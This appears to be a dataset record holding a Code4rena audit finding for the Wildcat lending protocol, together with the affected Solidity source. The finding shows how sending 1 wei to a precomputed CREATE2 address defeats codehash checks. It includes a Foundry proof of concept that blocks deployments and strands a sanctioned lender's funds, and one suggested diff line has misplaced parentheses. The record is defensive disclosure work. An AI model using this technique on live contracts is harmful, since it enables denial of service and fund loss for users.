{
  "Title": "[H-02] `codehash` check in factory contracts does not account for non-empty addresses",
  "Content": "\nIn `WildcatMarketControllerFactory.sol`, registered borrowers can call `deployController()` to deploy a `WildcatMarketController` contract for themselves.\n\nThe function checks if the `codehash` of the controller address is `bytes32(0)` to determine if the controller has already been deployed:\n\n[WildcatMarketControllerFactory.sol#L287-L296](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatMarketControllerFactory.sol#L287-L296)\n\n```solidity\n    // Salt is borrower address\n    bytes32 salt = bytes32(uint256(uint160(msg.sender)));\n    controller = LibStoredInitCode.calculateCreate2Address(\n      ownCreate2Prefix,\n      salt,\n      controllerInitCodeHash\n    );\n    if (controller.codehash != bytes32(0)) { // auditor: This check\n      revert ControllerAlreadyDeployed();\n    }\n```\n\nThis same check is also used in `deployMarket()`, which is called by borrowers to deploy markets:\n\n[WildcatMarketController.sol#L349-L353](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatMarketController.sol#L349-L353)\n\n```solidity\n    bytes32 salt = _deriveSalt(asset, namePrefix, symbolPrefix);\n    market = LibStoredInitCode.calculateCreate2Address(ownCreate2Prefix, salt, marketInitCodeHash);\n    if (market.codehash != bytes32(0)) {\n      revert MarketAlreadyDeployed();\n    }\n```\n\nThis check also exists in `createEscrow()`, which is called by markets to deploy an escrow contract whenever a sanctioned lender gets blocked:\n\n[WildcatSanctionsSentinel.sol#L104-L106](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatSanctionsSentinel.sol#L104-L106)\n\n```solidity\n    escrowContract = getEscrowAddress(borrower, account, asset);\n\n    if (escrowContract.codehash != bytes32(0)) return escrowContract;\n```\n\nHowever, this `<address>.codehash != bytes32(0)` check is insufficient to determine if an address has existing code. According to [EIP-1052](https://eips.ethereum.org/EIPS/eip-1052), addresses without code only return a `0x0` codehash when they are **empty**:\n\n> In case the account does not exist or is empty (as defined by [EIP-161](https://eips.ethereum.org/EIPS/eip-161)) `0` is pushed to the stack.\n>\n> In case the account does not have code the keccak256 hash of empty data (i.e. `c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470`) is pushed to the stack.\n\nAs seen from above, addresses without code can also return `keccak256(\"\")` as its `codehash` if it is non-empty. [EIP-161](https://eips.ethereum.org/EIPS/eip-161) states that an address must have a zero ETH balance for it to be empty:\n\n> An account is considered *empty* when it has **no code** and **zero nonce** and **zero balance**.\n\nAs such, if anyone transfers 1 wei to an address, `.codehash` will return `keccak256(\"\")` instead of `bytes32(0)`, making the checks shown above pass incorrectly.\n\nSince all contract deployments in the protocol use `CREATE2`, a malicious attacker can harm users by doing the following:\n\n- For controller deployments:\n  - Attacker calls [`computeControllerAddress()`](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatMarketControllerFactory.sol#L342-L347) to compute the controller address for a borrower.\n  - Attacker transfers 1 wei to it, causing `.codehash` to become non-zero.\n  - When `deployController()` is called by the borrower, the check passes, causing the function to revert.\n\n- For market deployments:\n  - Attacker calls [`computeMarketAddress()`](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatMarketController.sol#L221-L228) with arguments such that the deployment salt is the same.\n  - Attacker transfers 1 wei to the resulting market address, causing `.codehash` to become non-zero.\n  - When `deployMarket()` is called by the borrower, the function reverts.\n\n- For escrow deployments:\n  - Attacker calls [`getEscrowAddress()`](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatSanctionsSentinel.sol#L61-L85) with the `borrower`, sanctioned `lender` and market/asset address to compute the resulting escrow address.\n  - Attacker transfers 1 wei to the escrow address, causing `.codehash` to become non-zero.\n  - When either [`nukeFromOrbit()`](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarketConfig.sol#L74-L81) or [`executeWithdrawal()`](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarketWithdrawals.sol#L123-L188) is called, `createEscrow()` simply returns the escrow address instead of deploying an escrow contract.\n  - The market tokens and/or funds of the lender are transferred to the escrow address, causing them to be unrecoverable since the escrow contract was never deployed.\n\nNote that for controller deployments, since the salt is fixed to the `borrower` address and cannot be varied, the DOS for `deployController()` is permanent. This effectively locks the `borrower` out of all protocol functionality forever since they can never deploy a market controller for themselves.\n\n### Impact\n\nAn attacker can do the following at the cost of 1 wei and some gas:\n\n- Permanently lock a registered borrower out of all borrowing-related functionality by forcing `deployController()` to always revert for their address.\n- Grief market deployments by causing `deployMarket()` to always revert for a given `borrower`, `lender` and `market`.\n- Cause a sanctioned lender to lose all their funds in a market when `nukeFromOrbit()` or `executeWithdrawal()` is called for their address.\n\n### Proof of Concept\n\nThe code below contains three tests:\n\n- `test_CanDOSControllerDeployment()` demonstrates how an attacker can force `deployController()` to revert permanently for a borrower by transferring 1 wei to the computed controller address.\n- `test_CanDOSMarketDeployment()` demonstrates how `deployMarket()` can be forced to revert with the same attack.\n- `test_CanSkipEscrowDeployment()` shows how an attacker can skip the escrow deployment for a lender if they get blocked, causing their market tokens to be unrecoverable.\n\n<details>\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity >=0.8.20;\n\nimport 'src/WildcatSanctionsSentinel.sol';\nimport 'src/WildcatArchController.sol';\nimport 'src/WildcatMarketControllerFactory.sol';\nimport 'src/interfaces/IWildcatMarketControllerEventsAndErrors.sol';\n\nimport 'forge-std/Test.sol';\nimport 'test/shared/TestConstants.sol';\nimport 'test/helpers/MockERC20.sol';\n\ncontract CodeHashTest is Test, IWildcatMarketControllerEventsAndErrors {\n    // Wildcat contracts\n    address MOCK_CHAINALYSIS_ADDRESS = address(0x1337);\n    WildcatSanctionsSentinel sentinel;\n    WildcatArchController archController;\n    WildcatMarketControllerFactory controllerFactory;\n    \n    // Test contracts\n    MockERC20 asset;\n\n    // Users\n    address AIKEN;\n    address DUEET;\n\n    function setUp() external {\n        // Deploy Wildcat contracts\n        archController = new WildcatArchController();\n        sentinel = new WildcatSanctionsSentinel(address(archController), MOCK_CHAINALYSIS_ADDRESS);\n        MarketParameterConstraints memory constraints = MarketParameterConstraints({\n            minimumDelinquencyGracePeriod: MinimumDelinquencyGracePeriod,\n            maximumDelinquencyGracePeriod: MaximumDelinquencyGracePeriod,\n            minimumReserveRatioBips: MinimumReserveRatioBips,\n            maximumReserveRatioBips: MaximumReserveRatioBips,\n            minimumDelinquencyFeeBips: MinimumDelinquencyFeeBips,\n            maximumDelinquencyFeeBips: MaximumDelinquencyFeeBips,\n            minimumWithdrawalBatchDuration: MinimumWithdrawalBatchDuration,\n            maximumWithdrawalBatchDuration: MaximumWithdrawalBatchDuration,\n            minimumAnnualInterestBips: MinimumAnnualInterestBips,\n            maximumAnnualInterestBips: MaximumAnnualInterestBips\n        });\n        controllerFactory = new WildcatMarketControllerFactory(\n            address(archController),\n            address(sentinel),\n            constraints\n        );\n\n        // Register controllerFactory in archController\n        archController.registerControllerFactory(address(controllerFactory));\n\n        // Deploy asset token\n        asset = new MockERC20();\n\n        // Setup Aiken and register him as borrower\n        AIKEN = makeAddr(\"AIKEN\");\n        archController.registerBorrower(AIKEN);\n\n        // Setup Dueet and give him some asset token\n        DUEET = makeAddr(\"DUEET\");\n        asset.mint(DUEET, 1000e18);\n    }\n\n    function test_CanDOSControllerDeployment() public {\n        // Dueet front-runs Aiken and transfers 1 wei to Aiken's controller address\n        address controllerAddress = controllerFactory.computeControllerAddress(AIKEN);\n        payable(controllerAddress).transfer(1);\n\n        // Codehash of Aiken's controller address is now keccak256(\"\")\n        assertEq(controllerAddress.codehash, keccak256(\"\"));\n\n        // Aiken calls deployController(), but it reverts due to non-zero codehash\n        vm.prank(AIKEN);\n        vm.expectRevert(WildcatMarketControllerFactory.ControllerAlreadyDeployed.selector);\n        controllerFactory.deployController();\n    }\n\n    function test_CanDOSMarketDeployment() public {\n        // Deploy WildcatMarketController for Aiken\n        (WildcatMarketController controller, ) = _deployControllerAndMarket(\n            AIKEN,\n            address(0),\n            \"_\",\n            \"_\"\n        );\n\n        // Dueet front-runs Aiken and transfers 1 wei to market address\n        string memory namePrefix = \"Market Token\";\n        string memory symbolPrefix = \"MKT\";\n        address marketAddress = controller.computeMarketAddress(\n            address(asset), \n            namePrefix, \n            symbolPrefix\n        );\n        payable(marketAddress).transfer(1);\n\n        // Codehash of market address is now keccak256(\"\")\n        assertEq(marketAddress.codehash, keccak256(\"\"));\n\n        // Aiken calls deployMarket(), but it reverts due to non-zero codehash\n        vm.prank(AIKEN);\n        vm.expectRevert(MarketAlreadyDeployed.selector);\n        controller.deployMarket(\n            address(asset),\n            namePrefix,\n            symbolPrefix,\n            type(uint128).max,\n            MaximumAnnualInterestBips,\n            MaximumDelinquencyFeeBips,\n            MaximumWithdrawalBatchDuration,\n            MaximumReserveRatioBips,\n            MaximumDelinquencyGracePeriod\n        );\n    }\n\n    function test_CanSkipEscrowDeployment() public {\n        // Deploy WildcatMarketController and WildcatMarket for Aiken\n        (WildcatMarketController controller, WildcatMarket market) = _deployControllerAndMarket(\n            AIKEN,\n            address(asset),\n            \"Market Token\",\n            \"MKT\"\n        );\n\n        // Register Dueet as lender\n        address[] memory arr = new address[](1);\n        arr[0] = DUEET;\n        vm.prank(AIKEN);\n        controller.authorizeLenders(arr);\n\n        // Dueet becomes a lender in the market\n        vm.startPrank(DUEET);\n        asset.approve(address(market), 1000e18);\n        market.depositUpTo(1000e18);\n        vm.stopPrank();\n\n        // Dueet becomes sanctioned\n        vm.mockCall(\n            MOCK_CHAINALYSIS_ADDRESS,\n            abi.encodeCall(IChainalysisSanctionsList.isSanctioned, (DUEET)),\n            abi.encode(true)\n        );\n\n        // Attacker transfers 1 wei to Dueet's escrow address\n        // Note: Borrower and lender addresses are swapped due to a separate bug\n        address escrowAddress = sentinel.getEscrowAddress(DUEET, AIKEN, address(market));\n        payable(escrowAddress).transfer(1);\n\n        // Codehash of market address is now keccak256(\"\")\n        assertEq(escrowAddress.codehash, keccak256(\"\"));\n\n        // Dueet gets blocked in market\n        market.nukeFromOrbit(DUEET);\n\n        // Dueet's MKT tokens are transferred to his escrow address\n        assertEq(market.balanceOf(escrowAddress), 1000e18);\n\n        // However, the escrow contract was not deployed\n        assertEq(escrowAddress.code.length, 0); \n    }\n\n    function _deployControllerAndMarket(\n        address user, \n        address _asset,\n        string memory namePrefix, \n        string memory symbolPrefix\n    ) internal returns (WildcatMarketController, WildcatMarket){\n        vm.prank(user);\n        (address controller, address market) = controllerFactory.deployControllerAndMarket(\n            namePrefix,\n            symbolPrefix,\n            _asset,\n            type(uint128).max,\n            MaximumAnnualInterestBips,\n            MaximumDelinquencyFeeBips,\n            MaximumWithdrawalBatchDuration,\n            MaximumReserveRatioBips,\n            MaximumDelinquencyGracePeriod\n        );\n        return (WildcatMarketController(controller), WildcatMarket(market));\n    }\n}\n```\n</details>\n\n### Recommended Mitigation\n\nConsider checking if the codehash of an address is not `keccak256(\"\")` as well:\n\n[WildcatMarketControllerFactory.sol#L294-L296](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatMarketControllerFactory.sol#L294-L296)\n\n```diff\n-   if (controller.codehash != bytes32(0)) {\n+   if (controller.codehash != bytes32(0) && controller.codehash != keccak256(\"\")) {\n      revert ControllerAlreadyDeployed();\n    }\n```\n\n[WildcatMarketController.sol#L351-L353](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatMarketController.sol#L351-L353)\n\n```diff\n-   if (market.codehash != bytes32(0)) {\n+   if (market.codehash != bytes32(0) && market.codehash != keccak256(\"\")) {\n      revert MarketAlreadyDeployed();\n    }\n```\n\n[WildcatSanctionsSentinel.sol#L106](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatSanctionsSentinel.sol#L106)\n\n```diff\n-   if (escrowContract.codehash != bytes32(0)) return escrowContract;\n+   if (escrowContract.codehash != bytes32(0)) && escrowContract.codehash != keccak256(\"\") return escrowContract;\n```\n\nAlternatively, use `<address>.code.length != 0` to check if an address has code instead.\n\n### Assessed type\n\nInvalid Validation\n\n**[laurenceday (Wildcat) commented](https://github.com/code-423n4/2023-10-wildcat-findings/issues/491#issuecomment-1803374083):**\n > Fix for this is easier than suggested - just change from `x.codehash != bytes32(0)` to `x.code.length != 0`.\n> \n> Mitigated [here](https://github.com/wildcat-finance/wildcat-protocol/pull/57/commits/3b33a2f46b14079d3eb3b7429394b9e37c7fce03) and [here](https://github.com/wildcat-finance/wildcat-protocol/pull/57/commits/fcbf50c9dae18b51d7ec5acf556ab2fc0f8a834f).\n>\n > I'd emphasise here, however, that this is only a High Risk finding in the escrow situation - the others are grieving attacks that cause nothing to be \"lost\". Still a valuable finding, mind.\n\n**[laurenceday (Wildcat) confirmed](https://github.com/code-423n4/2023-10-wildcat-findings/issues/491#issuecomment-1810754722)**\n\n***\n\n",
  "Impact": "HIGH",
  "Source": "https://code4rena.com/reports/2023-10-wildcat",
  "Code": [
    {
      "filename": "src/WildcatMarketControllerFactory.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity >=0.8.20;\n\nimport { EnumerableSet } from 'openzeppelin/contracts/utils/structs/EnumerableSet.sol';\nimport './interfaces/WildcatStructsAndEnums.sol';\nimport './interfaces/IWildcatMarketController.sol';\nimport './interfaces/IWildcatArchController.sol';\nimport './libraries/LibStoredInitCode.sol';\nimport './libraries/MathUtils.sol';\nimport './market/WildcatMarket.sol';\nimport './WildcatMarketController.sol';\n\ncontract WildcatMarketControllerFactory {\n  using EnumerableSet for EnumerableSet.AddressSet;\n\n  event NewController(address borrower, address controller, string namePrefix, string symbolPrefix);\n  event UpdateProtocolFeeConfiguration(\n    address feeRecipient,\n    uint16 protocolFeeBips,\n    address originationFeeAsset,\n    uint256 originationFeeAmount\n  );\n\n  error NotRegisteredBorrower();\n  error InvalidProtocolFeeConfiguration();\n  error CallerNotArchControllerOwner();\n  error InvalidConstraints();\n  error ControllerAlreadyDeployed();\n\n  // Returns immutable arch-controller\n  IWildcatArchController public immutable archController;\n\n  // Returns sentinel used by controller\n  address public immutable sentinel;\n\n  address public immutable marketInitCodeStorage;\n\n  uint256 public immutable marketInitCodeHash;\n\n  address public immutable controllerInitCodeStorage;\n\n  uint256 public immutable controllerInitCodeHash;\n\n  uint256 internal immutable ownCreate2Prefix = LibStoredInitCode.getCreate2Prefix(address(this));\n\n  uint32 internal immutable MinimumDelinquencyGracePeriod;\n  uint32 internal immutable MaximumDelinquencyGracePeriod;\n\n  uint16 internal immutable MinimumReserveRatioBips;\n  uint16 internal immutable MaximumReserveRatioBips;\n\n  uint16 internal immutable MinimumDelinquencyFeeBips;\n  uint16 internal immutable MaximumDelinquencyFeeBips;\n\n  uint32 internal immutable MinimumWithdrawalBatchDuration;\n  uint32 internal immutable MaximumWithdrawalBatchDuration;\n\n  uint16 internal immutable MinimumAnnualInterestBips;\n  uint16 internal immutable MaximumAnnualInterestBips;\n\n  ProtocolFeeConfiguration internal _protocolFeeConfiguration;\n\n  EnumerableSet.AddressSet internal _deployedControllers;\n\n  modifier onlyArchControllerOwner() {\n    if (msg.sender != archController.owner()) {\n      revert CallerNotArchControllerOwner();\n    }\n    _;\n  }\n\n  constructor(\n    address _archController,\n    address _sentinel,\n    MarketParameterConstraints memory constraints\n  ) {\n    archController = IWildcatArchController(_archController);\n    sentinel = _sentinel;\n    if (\n      constraints.minimumAnnualInterestBips > constraints.maximumAnnualInterestBips ||\n      constraints.maximumAnnualInterestBips > 10000 ||\n      constraints.minimumDelinquencyFeeBips > constraints.maximumDelinquencyFeeBips ||\n      constraints.maximumDelinquencyFeeBips > 10000 ||\n      constraints.minimumReserveRatioBips > constraints.maximumReserveRatioBips ||\n      constraints.maximumReserveRatioBips > 10000 ||\n      constraints.minimumDelinquencyGracePeriod > constraints.maximumDelinquencyGracePeriod ||\n      constraints.minimumWithdrawalBatchDuration > constraints.maximumWithdrawalBatchDuration\n    ) {\n      revert InvalidConstraints();\n    }\n    MinimumDelinquencyGracePeriod = constraints.minimumDelinquencyGracePeriod;\n    MaximumDelinquencyGracePeriod = constraints.maximumDelinquencyGracePeriod;\n    MinimumReserveRatioBips = constraints.minimumReserveRatioBips;\n    MaximumReserveRatioBips = constraints.maximumReserveRatioBips;\n    MinimumDelinquencyFeeBips = constraints.minimumDelinquencyFeeBips;\n    MaximumDelinquencyFeeBips = constraints.maximumDelinquencyFeeBips;\n    MinimumWithdrawalBatchDuration = constraints.minimumWithdrawalBatchDuration;\n    MaximumWithdrawalBatchDuration = constraints.maximumWithdrawalBatchDuration;\n    MinimumAnnualInterestBips = constraints.minimumAnnualInterestBips;\n    MaximumAnnualInterestBips = constraints.maximumAnnualInterestBips;\n\n    (controllerInitCodeStorage, controllerInitCodeHash) = _storeControllerInitCode();\n    (marketInitCodeStorage, marketInitCodeHash) = _storeMarketInitCode();\n  }\n\n  function _storeControllerInitCode()\n    internal\n    virtual\n    returns (address initCodeStorage, uint256 initCodeHash)\n  {\n    bytes memory controllerInitCode = type(WildcatMarketController).creationCode;\n    initCodeHash = uint256(keccak256(controllerInitCode));\n    initCodeStorage = LibStoredInitCode.deployInitCode(controllerInitCode);\n  }\n\n  function _storeMarketInitCode()\n    internal\n    virtual\n    returns (address initCodeStorage, uint256 initCodeHash)\n  {\n    bytes memory marketInitCode = type(WildcatMarket).creationCode;\n    initCodeHash = uint256(keccak256(marketInitCode));\n    initCodeStorage = LibStoredInitCode.deployInitCode(marketInitCode);\n  }\n\n  function isDeployedController(address controller) external view returns (bool) {\n    return _deployedControllers.contains(controller);\n  }\n\n  function getDeployedControllersCount() external view returns (uint256) {\n    return _deployedControllers.length();\n  }\n\n  function getDeployedControllers() external view returns (address[] memory) {\n    return _deployedControllers.values();\n  }\n\n  function getDeployedControllers(\n    uint256 start,\n    uint256 end\n  ) external view returns (address[] memory arr) {\n    uint256 len = _deployedControllers.length();\n    end = MathUtils.min(end, len);\n    uint256 count = end - start;\n    arr = new address[](count);\n    for (uint256 i = 0; i < count; i++) {\n      arr[i] = _deployedControllers.at(start + i);\n    }\n  }\n\n  /**\n   * @dev Returns protocol fee configuration for new markets.\n   *\n   *      These can be updated by the arch-controller owner but\n   *      `protocolFeeBips` and `feeRecipient` are immutable once\n   *      a market is deployed.\n   *\n   * @return feeRecipient         feeRecipient to use in new markets\n   * @return originationFeeAsset  Asset used to pay fees for new market\n   *                              deployments\n   * @return originationFeeAmount Amount of originationFeeAsset paid\n   *                              for new market deployments\n   * @return protocolFeeBips      protocolFeeBips to use in new markets\n   */\n  function getProtocolFeeConfiguration()\n    external\n    view\n    returns (\n      address feeRecipient,\n      address originationFeeAsset,\n      uint80 originationFeeAmount,\n      uint16 protocolFeeBips\n    )\n  {\n    return (\n      _protocolFeeConfiguration.feeRecipient,\n      _protocolFeeConfiguration.originationFeeAsset,\n      _protocolFeeConfiguration.originationFeeAmount,\n      _protocolFeeConfiguration.protocolFeeBips\n    );\n  }\n\n  /**\n   * @dev Sets protocol fee configuration for new market deployments via\n   *      controllers deployed by this factory.\n   *\n   *      If caller is not `archController.owner()`, reverts with\n   *      `NotArchControllerOwner`.\n   *\n   *      Revert with `InvalidProtocolFeeConfiguration` if:\n   *      - `protocolFeeBips > 0 && feeRecipient == address(0)`\n   *      - OR `originationFeeAmount > 0 && originationFeeAsset == address(0)`\n   *      - OR `originationFeeAmount > 0 && feeRecipient == address(0)`\n   */\n  function setProtocolFeeConfiguration(\n    address feeRecipient,\n    address originationFeeAsset,\n    uint80 originationFeeAmount,\n    uint16 protocolFeeBips\n  ) external onlyArchControllerOwner {\n    bool hasOriginationFee = originationFeeAmount > 0;\n    bool nullFeeRecipient = feeRecipient == address(0);\n    bool nullOriginationFeeAsset = originationFeeAsset == address(0);\n    if (\n      (protocolFeeBips > 0 && nullFeeRecipient) ||\n      (hasOriginationFee && nullFeeRecipient) ||\n      (hasOriginationFee && nullOriginationFeeAsset)\n    ) {\n      revert InvalidProtocolFeeConfiguration();\n    }\n    _protocolFeeConfiguration = ProtocolFeeConfiguration({\n      feeRecipient: feeRecipient,\n      originationFeeAsset: originationFeeAsset,\n      originationFeeAmount: originationFeeAmount,\n      protocolFeeBips: protocolFeeBips\n    });\n  }\n\n  /**\n   * @dev Returns immutable constraints on market parameters that\n   *      the controller variant will enforce.\n   */\n  function getParameterConstraints()\n    external\n    view\n    returns (MarketParameterConstraints memory constraints)\n  {\n    constraints.minimumDelinquencyGracePeriod = MinimumDelinquencyGracePeriod;\n    constraints.maximumDelinquencyGracePeriod = MaximumDelinquencyGracePeriod;\n    constraints.minimumReserveRatioBips = MinimumReserveRatioBips;\n    constraints.maximumReserveRatioBips = MaximumReserveRatioBips;\n    constraints.minimumDelinquencyFeeBips = MinimumDelinquencyFeeBips;\n    constraints.maximumDelinquencyFeeBips = MaximumDelinquencyFeeBips;\n    constraints.minimumWithdrawalBatchDuration = MinimumWithdrawalBatchDuration;\n    constraints.maximumWithdrawalBatchDuration = MaximumWithdrawalBatchDuration;\n    constraints.minimumAnnualInterestBips = MinimumAnnualInterestBips;\n    constraints.maximumAnnualInterestBips = MaximumAnnualInterestBips;\n  }\n\n  /* -------------------------------------------------------------------------- */\n  /*                            Controller Deployment                           */\n  /* -------------------------------------------------------------------------- */\n\n  address internal _tmpMarketBorrowerParameter = address(1);\n\n  function getMarketControllerParameters()\n    external\n    view\n    virtual\n    returns (MarketControllerParameters memory parameters)\n  {\n    parameters.archController = address(archController);\n    parameters.borrower = _tmpMarketBorrowerParameter;\n    parameters.sentinel = sentinel;\n    parameters.marketInitCodeStorage = marketInitCodeStorage;\n    parameters.marketInitCodeHash = marketInitCodeHash;\n    parameters.minimumDelinquencyGracePeriod = MinimumDelinquencyGracePeriod;\n    parameters.maximumDelinquencyGracePeriod = MaximumDelinquencyGracePeriod;\n    parameters.minimumReserveRatioBips = MinimumReserveRatioBips;\n    parameters.maximumReserveRatioBips = MaximumReserveRatioBips;\n    parameters.minimumDelinquencyFeeBips = MinimumDelinquencyFeeBips;\n    parameters.maximumDelinquencyFeeBips = MaximumDelinquencyFeeBips;\n    parameters.minimumWithdrawalBatchDuration = MinimumWithdrawalBatchDuration;\n    parameters.maximumWithdrawalBatchDuration = MaximumWithdrawalBatchDuration;\n    parameters.minimumAnnualInterestBips = MinimumAnnualInterestBips;\n    parameters.maximumAnnualInterestBips = MaximumAnnualInterestBips;\n  }\n\n  /**\n   * @dev Deploys a create2 deployment of `WildcatMarketController`\n   *      unique to the borrower and registers it with the arch-controller.\n   *\n   *      If a controller is already deployed for the borrower, reverts\n   *      with `ControllerAlreadyDeployed`.\n   *\n   *\t  If `archController.isRegisteredBorrower(msg.sender)` returns false\n   *      reverts with `NotRegisteredBorrower`.\n   *\n   *      Calls `archController.registerController(controller)` and emits\n   *      `NewController(borrower, controller)`.\n   */\n  function deployController() public returns (address controller) {\n    if (!archController.isRegisteredBorrower(msg.sender)) {\n      revert NotRegisteredBorrower();\n    }\n    _tmpMarketBorrowerParameter = msg.sender;\n    // Salt is borrower address\n    bytes32 salt = bytes32(uint256(uint160(msg.sender)));\n    controller = LibStoredInitCode.calculateCreate2Address(\n      ownCreate2Prefix,\n      salt,\n      controllerInitCodeHash\n    );\n    if (controller.codehash != bytes32(0)) {\n      revert ControllerAlreadyDeployed();\n    }\n    LibStoredInitCode.create2WithStoredInitCode(controllerInitCodeStorage, salt);\n    _tmpMarketBorrowerParameter = address(1);\n    archController.registerController(controller);\n    _deployedControllers.add(controller);\n  }\n\n  /**\n   * @dev Deploys a create2 deployment of `WildcatMarketController`\n   *      unique to the borrower and registers it with the arch-controller,\n   *      then deploys a new market through the controller.\n   *\n   *      If a controller is already deployed for the borrower, reverts\n   *      with `ControllerAlreadyDeployed`.\n   *\n   *\t  If `archController.isRegisteredBorrower(msg.sender)` returns false\n   *\t  reverts with `NotRegisteredBorrower`.\n   *\n   *      Calls `archController.registerController(controller)` and emits\n   * \t  `NewController(borrower, controller, namePrefix, symbolPrefix)`.\n   */\n  function deployControllerAndMarket(\n    string memory namePrefix,\n    string memory symbolPrefix,\n    address asset,\n    uint128 maxTotalSupply,\n    uint16 annualInterestBips,\n    uint16 delinquencyFeeBips,\n    uint32 withdrawalBatchDuration,\n    uint16 reserveRatioBips,\n    uint32 delinquencyGracePeriod\n  ) external returns (address controller, address market) {\n    controller = deployController();\n    market = IWildcatMarketController(controller).deployMarket(\n      asset,\n      namePrefix,\n      symbolPrefix,\n      maxTotalSupply,\n      annualInterestBips,\n      delinquencyFeeBips,\n      withdrawalBatchDuration,\n      reserveRatioBips,\n      delinquencyGracePeriod\n    );\n  }\n\n  function computeControllerAddress(address borrower) external view returns (address) {\n    // Salt is borrower address\n    bytes32 salt = bytes32(uint256(uint160(borrower)));\n    return\n      LibStoredInitCode.calculateCreate2Address(ownCreate2Prefix, salt, controllerInitCodeHash);\n  }\n}"
    },
    {
      "filename": "src/WildcatMarketController.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity >=0.8.20;\n\nimport { EnumerableSet } from 'openzeppelin/contracts/utils/structs/EnumerableSet.sol';\nimport 'solady/utils/SafeTransferLib.sol';\nimport './market/WildcatMarket.sol';\nimport './interfaces/IWildcatArchController.sol';\nimport './interfaces/IWildcatMarketControllerEventsAndErrors.sol';\nimport './interfaces/IWildcatMarketControllerFactory.sol';\nimport './libraries/LibStoredInitCode.sol';\nimport './libraries/MathUtils.sol';\n\nstruct TemporaryReserveRatio {\n  uint128 reserveRatioBips;\n  uint128 expiry;\n}\n\nstruct TmpMarketParameterStorage {\n  address asset;\n  string namePrefix;\n  string symbolPrefix;\n  address feeRecipient;\n  uint16 protocolFeeBips;\n  uint128 maxTotalSupply;\n  uint16 annualInterestBips;\n  uint16 delinquencyFeeBips;\n  uint32 withdrawalBatchDuration;\n  uint16 reserveRatioBips;\n  uint32 delinquencyGracePeriod;\n}\n\ncontract WildcatMarketController is IWildcatMarketControllerEventsAndErrors {\n  using EnumerableSet for EnumerableSet.AddressSet;\n  using SafeCastLib for uint256;\n  using SafeTransferLib for address;\n\n  /* -------------------------------------------------------------------------- */\n  /*                                 Immutables                                 */\n  /* -------------------------------------------------------------------------- */\n\n  IWildcatArchController public immutable archController;\n\n  IWildcatMarketControllerFactory public immutable controllerFactory;\n\n  address public immutable borrower;\n\n  address public immutable sentinel;\n\n  address public immutable marketInitCodeStorage;\n\n  uint256 public immutable marketInitCodeHash;\n\n  uint256 internal immutable ownCreate2Prefix = LibStoredInitCode.getCreate2Prefix(address(this));\n\n  uint32 internal immutable MinimumDelinquencyGracePeriod;\n  uint32 internal immutable MaximumDelinquencyGracePeriod;\n\n  uint16 internal immutable MinimumReserveRatioBips;\n  uint16 internal immutable MaximumReserveRatioBips;\n\n  uint16 internal immutable MinimumDelinquencyFeeBips;\n  uint16 internal immutable MaximumDelinquencyFeeBips;\n\n  uint32 internal immutable MinimumWithdrawalBatchDuration;\n  uint32 internal immutable MaximumWithdrawalBatchDuration;\n\n  uint16 internal immutable MinimumAnnualInterestBips;\n  uint16 internal immutable MaximumAnnualInterestBips;\n\n  EnumerableSet.AddressSet internal _authorizedLenders;\n  EnumerableSet.AddressSet internal _controlledMarkets;\n\n  /// @dev Temporary storage for market parameters, used during market deployment\n  TmpMarketParameterStorage internal _tmpMarketParameters;\n\n  mapping(address => TemporaryReserveRatio) public temporaryExcessReserveRatio;\n\n  // MarketParameterConstraints internal immutable constraints\n\n  modifier onlyBorrower() {\n    if (msg.sender != borrower) {\n      revert CallerNotBorrower();\n    }\n    _;\n  }\n\n  modifier onlyControlledMarket(address market) {\n    if (!_controlledMarkets.contains(market)) {\n      revert NotControlledMarket();\n    }\n    _;\n  }\n\n  constructor() {\n    controllerFactory = IWildcatMarketControllerFactory(msg.sender);\n    MarketControllerParameters memory parameters = controllerFactory.getMarketControllerParameters();\n    archController = IWildcatArchController(parameters.archController);\n    borrower = parameters.borrower;\n    sentinel = parameters.sentinel;\n    marketInitCodeStorage = parameters.marketInitCodeStorage;\n    marketInitCodeHash = parameters.marketInitCodeHash;\n    MinimumDelinquencyGracePeriod = parameters.minimumDelinquencyGracePeriod;\n    MaximumDelinquencyGracePeriod = parameters.maximumDelinquencyGracePeriod;\n    MinimumReserveRatioBips = parameters.minimumReserveRatioBips;\n    MaximumReserveRatioBips = parameters.maximumReserveRatioBips;\n    MinimumDelinquencyFeeBips = parameters.minimumDelinquencyFeeBips;\n    MaximumDelinquencyFeeBips = parameters.maximumDelinquencyFeeBips;\n    MinimumWithdrawalBatchDuration = parameters.minimumWithdrawalBatchDuration;\n    MaximumWithdrawalBatchDuration = parameters.maximumWithdrawalBatchDuration;\n    MinimumAnnualInterestBips = parameters.minimumAnnualInterestBips;\n    MaximumAnnualInterestBips = parameters.maximumAnnualInterestBips;\n  }\n\n  /* -------------------------------------------------------------------------- */\n  /*                               Lender Registry                              */\n  /* -------------------------------------------------------------------------- */\n\n  /**\n   * @dev Returns the set of authorized lenders.\n   */\n  function getAuthorizedLenders() external view returns (address[] memory) {\n    return _authorizedLenders.values();\n  }\n\n  function getAuthorizedLenders(\n    uint256 start,\n    uint256 end\n  ) external view returns (address[] memory arr) {\n    uint256 len = _authorizedLenders.length();\n    end = MathUtils.min(end, len);\n    uint256 count = end - start;\n    arr = new address[](count);\n    for (uint256 i = 0; i < count; i++) {\n      arr[i] = _authorizedLenders.at(start + i);\n    }\n  }\n\n  function getAuthorizedLendersCount() external view returns (uint256) {\n    return _authorizedLenders.length();\n  }\n\n  function isAuthorizedLender(address lender) external view virtual returns (bool) {\n    return _authorizedLenders.contains(lender);\n  }\n\n  /**\n   * @dev Grant authorization for a set of lenders.\n   *\n   *      Note: Only updates the internal set of approved lenders.\n   *      Must call `updateLenderAuthorization` to apply changes\n   *      to existing market accounts\n   */\n  function 